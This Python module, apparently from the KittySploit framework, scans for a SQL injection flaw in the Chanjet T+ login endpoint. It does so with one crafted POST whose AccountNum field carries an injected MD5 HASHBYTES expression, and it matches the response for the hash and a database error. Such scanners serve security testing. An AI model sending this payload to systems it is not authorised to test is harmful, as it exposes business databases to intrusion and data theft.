#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Chanjet TPluse application has a SQL injection vulnerability, which can be used by attackers to obtain sensiti."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chanjet TPluse Ufida.T.SM.Login.UIP - SQL injection Detection',
        'description': 'Chanjet TPluse application has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'yonyou', 'chanjet', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20Plus%20%E5%AE%A1%E8%AE%A1%20%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%89.md',
        ],
    }

    def run(self):
        path = '/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='{"AccountNum":"123 or 8767 IN (SELECT (sys.fn_sqlvarbasetostr(HASHBYTES(\'MD5\',\'1\'))))","UserName":"admin","Password":"e10adc3949ba59abbe56e057f20f883e","rdpYear":"2021","rdpMonth":"12","rdpDate":"9","webServiceProcessID":"admin","ali_csessionid":"","ali_sig":"","ali_token":"","ali_scene":"","role":"","aqdKey":"","fromWhere":"browser","cardNo":""}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('0x06d49632c9dc9bcb62aeaef99612ba6b', 'Message":"245', 'DatabaseException',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Chanjet TPluse Ufida.T.SM.Login.UIP - SQL injection detected', path=path)
            return True
        return False

